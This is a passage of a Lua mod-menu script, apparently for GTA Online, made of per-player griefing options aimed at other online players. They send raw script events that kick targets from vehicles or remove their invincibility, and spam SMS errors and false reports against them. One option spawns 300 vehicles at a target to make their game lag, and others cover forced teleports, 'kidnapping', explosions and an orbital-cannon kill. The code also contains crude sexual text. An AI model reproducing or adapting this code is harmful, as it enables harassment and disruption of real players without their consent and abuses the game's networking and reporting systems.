	local forcefieldRoot = menu.list(funoptions, menuname("Forcefield", "Forcefield") .. ": " .. menuname("Forcefield", forcefieldOpt[ 1 ]) ) 

	for i, option in ipairs(forcefieldOpt) do
		menu.action(forcefieldRoot, menuname("Forcefield", option), {}, "", function()
			currentForcefield = i
			menu.set_menu_name(forcefieldRoot, menuname("Forcefield", "Forcefield") .. ": " .. menuname("Forcefield", option) )
			menu.focus(forcefieldRoot)
		end)
	end

	util.create_tick_handler(function()
		if currentForcefield == 1 then -- disable
			return true
		elseif currentForcefield == 2 then -- push out
			local pos1 = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
			local entities = getNearbyEntities(pid, 10)
            
			for _, entity in ipairs(entities) do
				local pos2 = ENTITY.GET_ENTITY_COORDS(entity)
				local force = vect.norm(vect.subtract(pos2, pos1))
				if ENTITY.IS_ENTITY_A_PED(entity)  then
					if not PED.IS_PED_A_PLAYER(entity) and not PED.IS_PED_IN_ANY_VEHICLE(entity, true) then
						RequestControlOfEnt(entity)
						PED.SET_PED_TO_RAGDOLL(entity, 1000, 1000, 0, 0, 0, 0)
						ENTITY.APPLY_FORCE_TO_ENTITY(entity, 1, force.x, force.y, force.z, 0, 0, 0.5, 0, false, false, true)
					end
				else
					RequestControlOfEnt(entity)
					ENTITY.APPLY_FORCE_TO_ENTITY(entity, 1, force.x, force.y, force.z, 0, 0, 0.5, 0, false, false, true)
				end
			end

		elseif currentForcefield == 3 then -- destroy
			local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
			FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 29, 5.0, false, true, 0.0, true)
		end
		return true
	end)

--------------------------------------------------------------------------
--Inv Spawn
--------------------------------------------------------------------------

    menu.toggle_loop(funoptions, "SMS Bomber", {"Ispam"}, "Spamming errors from different NPCs in the contact list", function()
        for i = 101, 175 do
            trigger_script_event(1 << pid, {-634789188, pid, i})
        end
    end)

-------------------------------------
-- Drive Veh
-------------------------------------

    local nearbyVehicleMenus = {}
    local function _check_exists(vehicle)
        if not ENTITY.DOES_ENTITY_EXIST(vehicle) then
            menu.delete(nearbyVehicleMenus[vehicle].menu)
            nearbyVehicleMenus[vehicle] = nil
            return false
        end
        return true
    end
    function add_vehicle_to_list(vehicle)
            if nearbyVehicleMenus[vehicle] then return end
            -- Ignore destroyed vehicles
            if ENTITY.GET_ENTITY_HEALTH(vehicle) == 0 then return end
            local driver = VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1)
            -- Ignore moving driving ambient vehicles
            if driver > 0 and not PED.IS_PED_A_PLAYER(driver) and ENTITY.GET_ENTITY_SPEED(vehicle) > 0 then
                return
            end
            local model = ENTITY.GET_ENTITY_MODEL(vehicle)
            local name = VEHICLE.GET_DISPLAY_NAME_FROM_VEHICLE_MODEL(model)
            local manu = VEHICLE._GET_MAKE_NAME_FROM_VEHICLE_MODEL(model)
            local prefix = (manu ~= "") and (manu .. " " .. name) or name
            nearbyVehicleMenus[vehicle] = { menu = vehMenu, prefix = prefix }
        end
        driveClone = {
        vehicle = 0,
        target = 0
    }
    function get_player_vehicle_in_control(pid, opts)
        local my_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()) -- Needed to turn off spectating while getting control
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        -- Calculate how far away from target
        local pos1 = ENTITY.GET_ENTITY_COORDS(target_ped)
        local pos2 = ENTITY.GET_ENTITY_COORDS(my_ped)
        local dist = SYSTEM.VDIST2(pos1.x, pos1.y, 0, pos2.x, pos2.y, 0)
        local was_spectating = NETWORK.NETWORK_IS_IN_SPECTATOR_MODE() -- Needed to toggle it back on if currently spectating
        -- If they out of range (value may need tweaking), auto spectate.
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(target_ped, true)
        if opts and opts.near_only and vehicle == 0 then
            return 0
        end
        if vehicle == 0 and target_ped ~= my_ped and dist > 340000 and not was_spectating then
            toast("The player is too far away, automatic observation up to 3 seconds.")
            NETWORK.NETWORK_SET_IN_SPECTATOR_MODE(true, target_ped)
            -- To prevent a hard 3s loop, we keep waiting upto 3s or until vehicle is acquired
            local loop = (opts and opts.loops ~= nil) and opts.loops or 30 -- 3000 / 100
            while vehicle == 0 and loop > 0 do
                util.yield(100)
                vehicle = PED.GET_VEHICLE_PED_IS_IN(target_ped, true)
                loop = loop - 1
            end
            HUD.BUSYSPINNER_OFF()
        end

        if vehicle > 0 then
            if NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(vehicle) then
                return vehicle
            end
            -- Loop until we get control
            local netid = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(vehicle)
            local has_control_ent = false
            local loops = 15
            NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netid, true)

            -- Attempts 15 times, with 8ms per attempt
            while not has_control_ent do
                has_control_ent = NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle)
                loops = loops - 1
                -- wait for control
                util.yield(15)
                if loops <= 0 then
                    break
                end
            end
        end
        if not was_spectating then
            NETWORK.NETWORK_SET_IN_SPECTATOR_MODE(false, target_ped)
        end
        return vehicle
    end
    function control_vehicle(pid, callback, opts)
        local vehicle = get_player_vehicle_in_control(pid, opts)
        if vehicle > 0 then
            callback(vehicle)
        elseif opts == nil or opts.silent ~= true then
            toast("The player is not in the car or out of range.")
        end
    end
    menu.toggle(funoptions, "Drive Vehicle", {"Dveh"}, "Manage transport", function (on)
        if on then
            control_vehicle(pid, function(vehicle)
                local saveData = vehiclelib.Serialize(vehicle)
                local my_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
                local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(my_ped, 0.0, 5.0, 0.5)
                local heading = ENTITY.GET_ENTITY_HEADING(vehicle)
                local cvehicle = entities.create_vehicle(saveData.Model, pos, heading)
                add_vehicle_to_list(cvehicle)
                driveClone.vehicle = cvehicle
                driveClone.target = vehicle
                vehiclelib.ApplyToVehicle(cvehicle, saveData)
                ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle, cvehicle, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0, false, true, false, false, 2, true)
                for _ = 1, 5 do
                    TASK.TASK_WARP_PED_INTO_VEHICLE(my_ped, cvehicle, -1)
                    util.yield(10)
                end
            end)
        elseif driveClone.vehicle > 0 and ENTITY.DOES_ENTITY_EXIST(driveClone.vehicle) then
            ENTITY.SET_ENTITY_VISIBLE(driveClone.target, true)
            entities.delete_by_handle(driveClone.vehicle)
            driveClone.vehicle = 0
            driveClone.target = 0
        end
    end)

-------------------------------------
-- PIGGY BACK
-------------------------------------

	menu.toggle(funoptions, "Piggy Back", {"Pback"}, "The player will not see you sitting on it.", function (toggle)
		if players.user() == pid then return end
		gUsingPiggyback = toggle
		if gUsingPiggyback then
			gUsingRape = false
			local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
			STREAMING.REQUEST_ANIM_DICT("rcmjosh2")
			while not STREAMING.HAS_ANIM_DICT_LOADED("rcmjosh2") do
				util.yield()
			end
			ENTITY.ATTACH_ENTITY_TO_ENTITY(PLAYER.PLAYER_PED_ID(), p, PED.GET_PED_BONE_INDEX(p, 0xDD1C), 0, -0.2, 0.65, 0, 0, 180, false, true, false, false, 0, true)
			TASK.TASK_PLAY_ANIM(PLAYER.PLAYER_PED_ID(), "rcmjosh2", "josh_sitting_loop", 8, -8, -1, 1, 0, false, false, false)
			while gUsingPiggyback do
				util.yield()
				if not NETWORK.NETWORK_IS_PLAYER_CONNECTED(pid) then
					gUsingPiggyback = false; break
				end
			end
			TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.PLAYER_PED_ID())
			ENTITY.DETACH_ENTITY(PLAYER.PLAYER_PED_ID(), true, false)
		end
	end)
              
    menu.toggle(funoptions, "Child Lock", {"Clock"}, "lock in ts", function (toggle)
    	local vehicle = get_player_veh(pid)
		if vehicle == NULL then return end
		requestControlLoop(vehicle)
		if toggle then
			VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 4)
            VEHICLE.SET_VEHICLE_COLOURS(vehicle, 135, 135)
			VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "ISUCKDICK")
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(vehicle, true)
		    for wheelId = 0, 7 do
		    	VEHICLE.SET_VEHICLE_TYRE_BURST(vehicle, wheelId, true, 1000.0)
            end
		else
			VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 1)
            VEHICLE.SET_VEHICLE_COLOURS(vehicle, 92, 92)
			VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "OPEN")
            VEHICLE.SET_VEHICLE_FIXED(vehicle)
		end
	end)

    menu.toggle(funoptions, "Blackhole target", {"bhtarget"}, "Black hole.", function(on)
        if on then
            if not blackhole then
                blackhole = true
                menu.trigger_commands("blackhole on")
            end
            bh_target = pid
        else
            bh_target = -1
            if blackhole then
                blackhole = false
                menu.trigger_commands("blackhole off")
            end
        end
    end, false)
	
    menu.toggle_loop(funoptions, "Remove Player Godmode", {"brgm", "brgm1"}, "Remove year mod.", function ()
		trigger_script_event(1 << pid, {-1388926377, pid, -1762807505})
	end)

    menu.toggle_loop(funoptions, "Rocket Rain", {"Rrain"}, "bombard with rockets.", function ()
    	rain_rockets(pid, false)
        wait(250)
	end)

    menu.toggle(funoptions, "Invert Control", {"invet", "invert1"}, "Invert control.", function (toggle)
		local vehicle = get_player_veh(pid)
        if vehicle then
            if toggle then
                VEHICLE._SET_VEHICLE_CONTROLS_INVERTED(vehicle, true)
            else
                VEHICLE._SET_VEHICLE_CONTROLS_INVERTED(vehicle, false)
            end             
        end
	end)

 	menu.toggle(funoptions, "Freeze", {"freezveh"}, "", function(toggle)
		local vehicle = get_player_veh(pid)
		if vehicle then
		    requestControlLoop(vehicle)
		    ENTITY.FREEZE_ENTITY_POSITION(vehicle, toggle)
        end
	end)

	menu.toggle(funoptions, "Report Spam", {}, "Spam the player with reports(The game may lag in progress)", function(on)
		spam = on
		while spam do
			if pid ~= players.user() then
				trigger_command("reportvcannoying " .. PLAYER.GET_PLAYER_NAME(pid))
				trigger_command("reportvchate " .. PLAYER.GET_PLAYER_NAME(pid))
				trigger_command("reportannoying " .. PLAYER.GET_PLAYER_NAME(pid))
				trigger_command("reporthate " .. PLAYER.GET_PLAYER_NAME(pid))
				trigger_command("reportexploits " .. PLAYER.GET_PLAYER_NAME(pid))
				trigger_command("reportbugabuse " .. PLAYER.GET_PLAYER_NAME(pid))
			end
			wait()
		end
	end)

 menu.toggle_loop(funoptions,"Cheak distance (jail)", {}, "", function()
        if not players.exists(pid) then return end
        local dist = Get_Distance2D(pid, v3.new(1642.7058, 2570.6968, 45.564854))
        if dist > 25 then
            local my_pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), 1642.5663, 2570.5613, 45.56485)
            menu.trigger_commands("givesh " .. players.get_name(pid))
            menu.trigger_commands("summon " .. players.get_name(pid))
            menu.trigger_commands("invisibility on")
            menu.trigger_commands("otr")
            wait(5000)
            menu.trigger_commands("invisibility off")
            menu.trigger_commands("otr")
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), my_pos.x, my_pos.y, my_pos.z)
        end
        wait(2500)
    end)

    menu.click_slider(funoptions,"Kamikaze", {"kami"}, "SuWu", 1, 3, 1, 1, function(value)
        local planes = {"lazer", "mammatus", "cuban800"}
		local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local pos = getOffsetFromEntityGivenDistance(targetPed, 20.0)
		pos.z = pos.z + 30.0
		local hash = joaat(planes[ value ])
		requestModels(hash)
		local plane = entities.create_vehicle(hash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
		setEntityFaceEntity(plane, targetPed, true)
		ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(plane, true)
		VEHICLE.SET_VEHICLE_FORWARD_SPEED(plane, 150)
		VEHICLE.CONTROL_LANDING_GEAR(plane, 3)
	end)

    menu.action(funoptions,"Send to jail", {"Jail"}, "send to jail", function(enable)
        local my_pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), 1642.5663, 2570.5613, 45.56485)
        local shkonka = joaat("bkr_prop_biker_campbed_01")
        local toilet = joaat("prop_ld_toilet_01")
        requestModels(shkonka, toilet)
        OBJECT.CREATE_OBJECT(shkonka, 1644.8708, 2566.7224, 44.60825, true, false, true)
        OBJECT.CREATE_OBJECT(shkonka, 1640.2146, 2566.7617, 44.60825, true, false, true)
        OBJECT.CREATE_OBJECT(toilet, 1645.2335, 2573.8955, 44.60825, true, false, true)
        menu.trigger_commands("givesh " .. players.get_name(pid))
        menu.trigger_commands("summon " .. players.get_name(pid))
        menu.trigger_commands("invisibility on")
        menu.trigger_commands("otr")
        wait(5000)
        menu.trigger_commands("invisibility off")
        menu.trigger_commands("otr")
        trigger_command("disarm" .. players.get_name(pid) .. " on")
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), my_pos.x, my_pos.y, my_pos.z)
    end)

        
    menu.action(funoptions,"Creeper Clown", {"Clown"}, "Oh Shit", function() 
        local hash = joaat("s_m_y_clown_01")
		local explosion = Effect.new("scr_rcbarry2", "scr_exp_clown")
		local appears = Effect.new("scr_rcbarry2",  "scr_clown_appears")

		AUDIO.REQUEST_SCRIPT_AUDIO_BANK("BARRY_02_CLOWN_A", false, -1)
		AUDIO.REQUEST_SCRIPT_AUDIO_BANK("BARRY_02_CLOWN_B", false, -1)
		AUDIO.REQUEST_SCRIPT_AUDIO_BANK("BARRY_02_CLOWN_C", false, -1)

		requestModels(hash)
		local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local pos = ENTITY.GET_ENTITY_COORDS(player)
		local coord = getOffsetFromEntityGivenDistance(player, 7.0)
		local ped = entities.create_ped(0, hash, coord, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
	
		requestPtfxAsset(appears.asset)
		GRAPHICS.USE_PARTICLE_FX_ASSET(appears.asset)
		GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(appears.name, ped, 0.0, 0.0, -1.0, 0.0, 0.0, 0.0, 0.5, false, false, false, false)
		setEntityFaceEntity(ped, player)
		PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true) 
		
		TASK.TASK_GO_TO_COORD_ANY_MEANS(ped, pos.x, pos.y, pos.z, 5.0, 0, 0, 0, 0)
		local dest = pos
		PED.SET_PED_KEEP_TASK(ped, true)
		AUDIO.STOP_PED_SPEAKING(ped, true)
		AUDIO.SET_AMBIENT_VOICE_NAME(ped, "CLOWNS")
		
		util.create_tick_handler(function()
			local pos = ENTITY.GET_ENTITY_COORDS(ped)
			local targetPos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
			if vect.dist2(pos, targetPos) < 9.0 then
				requestPtfxAsset(explosion.asset)
				GRAPHICS.USE_PARTICLE_FX_ASSET(explosion.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					explosion.name, 
					pos.x, 
					pos.y, 
					pos.z, 
					0.0, 
					0.0, 
					0.0, 
					1.0, 
					false, false, false, false
				)
				FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 0, 1.0, true, true, 1.0)
				ENTITY.SET_ENTITY_VISIBLE(ped, false, 0)
				return false
			elseif vect.dist2(targetPos, dest) > 9.0 then
				dest = targetPos
				TASK.TASK_GO_TO_COORD_ANY_MEANS(ped, targetPos.x, targetPos.y, targetPos.z, 5.0, 0, 0, 0, 0)
			end
			return true
		end)
		AUDIO.RELEASE_NAMED_SCRIPT_AUDIO_BANK("BARRY_02_CLOWN_A")
		AUDIO.RELEASE_NAMED_SCRIPT_AUDIO_BANK("BARRY_02_CLOWN_B")
		AUDIO.RELEASE_NAMED_SCRIPT_AUDIO_BANK("BARRY_02_CLOWN_C")
	end)

    menu.action(funoptions,"Make him Lag", {"lowfps"}, "Lose fps", function() -- cpu burn simulator v2
		while not STREAMING.HAS_MODEL_LOADED(447548909) do
			STREAMING.REQUEST_MODEL(447548909)
			wait(10)
		end
		local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        local OldCoords = ENTITY.GET_ENTITY_COORDS(self_ped) --save location
		ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self_ped, 24, 7643.5, 19, true, true, true)

		trigger_command("anticrashcamera on")
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
		spam_amount = 300
		while spam_amount >= 1 do
			entities.create_vehicle(447548909, PlayerPedCoords, 0)
			spam_amount = spam_amount - 1
			wait(10)
		end
		trigger_command("anticrashcamera off")
	end)

    menu.action(funoptions,"Spawn Attacker Tank", {}, "Есть пробитие.", function()
		V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		if table_kidnap == nil then
			table_kidnap = {}
		end
        hash = joaat("rhino")
        ped_hash = joaat("MP_M_Cocaine_01")

        if STREAMING.IS_MODEL_A_VEHICLE(hash) then
            STREAMING.REQUEST_MODEL(hash)

            while not STREAMING.HAS_MODEL_LOADED(hash) do
                wait()
            end

            local aab = {
				x = -5784.258301,
				y = -8289.385742,
				z = -136.411270
			}

            ENTITY.SET_ENTITY_VISIBLE(ped_to_kidnap, false)
            ENTITY.FREEZE_ENTITY_POSITION(ped_to_kidnap, false)

            table_kidnap[veh_to_attach] = entities.create_vehicle(hash, ENTITY.GET_ENTITY_COORDS(V3, true), CAM.GET_FINAL_RENDERED_CAM_ROT(0).z)
            while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
                STREAMING.REQUEST_MODEL(ped_hash)
                wait()
            end
            ped_to_kidnap = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
            ped_to_drive = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)

            ENTITY.SET_ENTITY_INVINCIBLE(table_kidnap[veh_to_attach], true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(table_kidnap[veh_to_attach], ped_to_kidnap, 0, 0, 1, -1, 0, 0, 0, false, true, true, false, 0, false)

            coords_ped = v3()
            coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)
            coords_ped.x = coords_ped.x + math.random(-20, 20)
            coords_ped.y = coords_ped.y + math.random(-20, 20)
            coords_ped.z = coords_ped.z

            ENTITY.SET_ENTITY_COORDS(ped_to_kidnap, coords_ped.x, coords_ped.y, coords_ped.z, false, false, false, false)
            PED.SET_PED_INTO_VEHICLE(ped_to_drive, table_kidnap[veh_to_attach], -1)

            VEHICLE.SET_VEHICLE_ENGINE_ON(table_kidnap[veh_to_attach], true, true, false)
            TASK.TASK_VEHICLE_SHOOT_AT_PED(ped_to_drive, V3, 1)
            TASK.TASK_VEHICLE_CHASE(ped_to_drive, V3)
            wait(1)

            entities.delete_by_handle(ped_to_kidnap)
            veh_to_attach = veh_to_attach + 1

            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(ped_hash)
        end
	end)

	menu.action(funoptions,"Kidnap Player", {"deliver"}, "Похитить игрока.", function()
		V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

		if table_kidnap == nil then
			table_kidnap = {}
		end

        hash = joaat("stockade")
        ped_hash = joaat("MP_M_Cocaine_01")

        if STREAMING.IS_MODEL_A_VEHICLE(hash) then
            STREAMING.REQUEST_MODEL(hash)

            while not STREAMING.HAS_MODEL_LOADED(hash) do
                wait()
            end

            coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)

            local aab = {
				x = -5784.258301,
				y = -8289.385742,
				z = -136.411270
			}

            ENTITY.SET_ENTITY_VISIBLE(ped_to_kidnap, false)
            ENTITY.FREEZE_ENTITY_POSITION(ped_to_kidnap, true)

            table_kidnap[veh_to_attach] = entities.create_vehicle(hash, ENTITY.GET_ENTITY_COORDS(V3, true),
            CAM.GET_FINAL_RENDERED_CAM_ROT(0).z)
            while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
                STREAMING.REQUEST_MODEL(ped_hash)
                wait()
            end
            ped_to_kidnap = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
            ped_to_drive = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)

            ENTITY.SET_ENTITY_INVINCIBLE(ped_to_drive, true)
            ENTITY.SET_ENTITY_INVINCIBLE(table_kidnap[veh_to_attach], true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(table_kidnap[veh_to_attach], ped_to_kidnap, 0, 0, 1, -1, 0, 0, 0, false, true, true, false, 0, false)
            ENTITY.SET_ENTITY_COORDS(ped_to_kidnap, coords_ped.x, coords_ped.y, coords_ped.z - 1, false, false, false, false)
            PED.SET_PED_INTO_VEHICLE(ped_to_drive, table_kidnap[veh_to_attach], -1)
            TASK.TASK_VEHICLE_DRIVE_WANDER(ped_to_drive, table_kidnap[veh_to_attach], 20, 16777216)
            wait(500)

            entities.delete_by_handle(ped_to_kidnap)
            veh_to_attach = veh_to_attach + 1

            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(ped_hash)
        end
	end)

    menu.action(funoptions, "Chop up", {"chopup"}, "Spawns a wound up vert under your feet.", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        coords.x = coords['x']
        coords.y = coords['y']
        coords.z = coords['z']+2.5
        local hash = joaat("buzzard")
        request_model_load(hash)
        local heli = entities.create_vehicle(hash, coords, ENTITY.GET_ENTITY_HEADING(target_ped))
        VEHICLE.SET_VEHICLE_ENGINE_ON(heli, true, true, false)
        VEHICLE.SET_HELI_BLADES_FULL_SPEED(heli)
        ENTITY.SET_ENTITY_INVINCIBLE(heli, true)
        ENTITY.FREEZE_ENTITY_POSITION(heli, true)
        ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(heli, true, true)
        ENTITY.SET_ENTITY_ROTATION(heli, 180, 0.0, ENTITY.GET_ENTITY_HEADING(target_ped), 0)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(heli, coords.x, coords.y, coords.z, true, false, false)
        VEHICLE.SET_VEHICLE_ENGINE_ON(heli, true, true, true)
    end)
---------------------------------------------------------------------------------------
--teleports
---------------------------------------------------------------------------------------

	local function tp_player_vehicle(player, pos)
		local vehicle = get_vehicle_player_is_in(player)
		if vehicle ~= NULL and request_control(vehicle, 1000) then
			ENTITY.SET_ENTITY_COORDS(vehicle, pos.x, pos.y, pos.z, false, false, false)
		elseif vehicle ~= NULL then
			toast("Failed to get control of the vehicle.")
		end
	end

	menu.action(Teleport, "TP to Me", {"tp2me"}, "Teleport chela in vehicle to yourself.",function()
	local coords = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
		tp_veh_to(pid,coords.x,coords.y,coords.z)
	end)

	menu.action(Teleport, "TP to Ocean", {"tp2sea"}, "Teleports the chela in the vehicle to the ocean.",function()
		tp_veh_to(pid,2559,-4261,0)
	end)
        
    menu.action(Teleport, "TP to Prision", {"tp2pris"}, "Teleports the chela in the vehicle to prison.",function()	
			tp_veh_to(pid,1680,2512,45)
	end)
 
    menu.action(Teleport, "TP to Fort Zancudo", {"tp2zanc"}, "Teleports the chela in the vehicle to the military base.",function()		
		tp_veh_to(pid,-2219,3213,32)
	end)
    
    menu.action(Teleport, "TP to Waypoint", {"tp2Waypoint"}, "Teleports the chela to the vehicle on the waypoint.",function()
        local pos = getWaypointCoords()
		tp_player_vehicle(pid,pos)
	end)

    menu.action(funoptions, "Little Trolling", {}, "Not a big setup player", function()
        trigger_command("bountyall 10000")
        toast("This will take some time")
        wait(15000)
        toast("Initiating")
        for i = 1, 5 do
            trigger_command("as" .. PLAYER.GET_PLAYER_NAME(pid) .. " explodeall")
            wait(2000)
        end
        toast("Initiating")
    end)
                
    menu.action(funoptions, "Kick From Veh", {"vehkick"}, "Kick out from ts.",function()
        local param = {578856274, PLAYER.PLAYER_ID(), 0, 0, 0, 0, 1, PLAYER.PLAYER_ID(), MISC.GET_FRAME_COUNT()}
		trigger_script_event(1 << pid, param)
	end)

	menu.action(funoptions, "Disable veh Invincibility", {"removeinv"}, "Removes year mod from ts",function()
		local vehicle = get_player_veh(pid)
		if vehicle then	
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false) 
		end
	end)

    menu.action(funoptions, "Burst Tires", {"btires"}, "puncture tires", function()
		local vehicle = get_player_veh(pid)
		if vehicle then
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(vehicle, true)
            for wheelId = 0, 7 do
                VEHICLE.SET_VEHICLE_TYRE_BURST(vehicle, wheelId, true, 1000.0)
            end
        end
	end)

    menu.action(funoptions, "Catapult", {"catapult"}, "catapult up", function()
		local vehicle = get_player_veh(pid)
		if vehicle then
		requestControlLoop(vehicle)
			ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, 0.0, 0.0, 9999, 0.0, 0.0, 0.0, 1, false, true, true, true, true)
		end
	end)

	menu.action(funoptions, "Destroy Engine", {"killveh"}, "Engine failure", function()
		local vehicle = get_player_veh(pid)
		if vehicle then
			VEHICLE.SET_VEHICLE_ENGINE_HEALTH(vehicle, -4000)
			VEHICLE.SET_VEHICLE_BODY_HEALTH(vehicle, -4000)
			VEHICLE.SET_VEHICLE_PETROL_TANK_HEALTH(vehicle, -4000)
		end
	end)

	menu.action(funoptions, "Explode Vehicle", {"explodeveh"}, "Undermining the vehicle",function()
		local vehicle = get_player_veh(pid,false)
		if vehicle then
			VEHICLE.ADD_VEHICLE_PHONE_EXPLOSIVE_DEVICE(vehicle)
			VEHICLE.DETONATE_VEHICLE_PHONE_EXPLOSIVE_DEVICE()
		end
	end)

    gSound = {
        zoomOut 			= Sound.new("zoom_out_loop", "dlc_xm_orbital_cannon_sounds"),
        activating			= Sound.new("cannon_activating_loop", "dlc_xm_orbital_cannon_sounds"),
        backgroundLoop 		= Sound.new("background_loop", "dlc_xm_orbital_cannon_sounds"),
        fireLoop 			= Sound.new("cannon_charge_fire_loop", "dlc_xm_orbital_cannon_sounds")
    }

	menu.action(funoptions, "Kill With Orbital Cannon", {"orbital"}, "", function()
		if players.is_in_interior(pid) then
			toast("The player is in interior")
			return
		end
		
		if gUsingOrbitalCannon then
			CAM.DO_SCREEN_FADE_OUT(500)
			wait(1000)
			gCannonTarget = pid
			CAM.DO_SCREEN_FADE_IN(500)
			return
		end
		
		gUsingOrbitalCannon = true
		gCannonTarget = pid
		local height
		local cam
		local zoom = 0.0
		local lastZoom
		local scaleform
		local maxFov = 110
		local minFov = 25
		local fov = maxFov
		
		local set_cannon_cam_zoom = function ()
			if not PAD._IS_USING_KEYBOARD(2) then
				return
			end
			if PAD.IS_CONTROL_JUST_PRESSED(2, 241) then
				if zoom < 1.0 then
					zoom = zoom + 0.25
				end
			end
			if PAD.IS_CONTROL_JUST_PRESSED(2, 242) then
				if zoom > 0.0 then
					zoom = zoom - 0.25
				end
			end
	
			local fovLimit = minFov + (maxFov - minFov) * (1 - zoom)
			fov = increment(fov, 1.0, fovLimit)		
			if zoom ~= lastZoom then
				gSound.zoomOut:play()
			
				GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SET_ZOOM_LEVEL")
				GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(zoom)
				GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
				lastZoom = zoom
			end
		
			if fov ~= fovLimit then
				CAM.SET_CAM_FOV(cam, fov)
			else
				gSound.zoomOut:stop()
			end
		end

		AUDIO.REQUEST_SCRIPT_AUDIO_BANK("DLC_CHRISTMAS2017/XM_ION_CANNON", false, -1)
		AUDIO.START_AUDIO_SCENE("dlc_xm_orbital_cannon_camera_active_scene")
		gSound.activating:play()
		
		CAM.DO_SCREEN_FADE_OUT(500)
		wait(1000)
		CAM.DESTROY_ALL_CAMS(true)
		cam = CAM.CREATE_CAM("DEFAULT_SCRIPTED_CAMERA", false)
		CAM.SET_CAM_ROT(cam, -90.0, 0.0, 0.0, 2)
		CAM.SET_CAM_FOV(cam, fov)
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(gCannonTarget))
		height = pos.z + 150
		CAM.SET_CAM_COORD(cam, pos.x, pos.y, height)
		CAM.SET_CAM_ACTIVE(cam, true)
		CAM.RENDER_SCRIPT_CAMS(true, false, 3000, true, false, 0)
		GRAPHICS.ANIMPOSTFX_PLAY("MP_OrbitalCannon", 0, true)
		
		ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), true)
		STREAMING.SET_FOCUS_POS_AND_VEL(pos.x, pos.y, pos.z, 5.0, 0.0, 0.0)
		menu.trigger_commands("becomeorbitalcannon on")
		wait(1000)
		CAM.DO_SCREEN_FADE_IN(500)

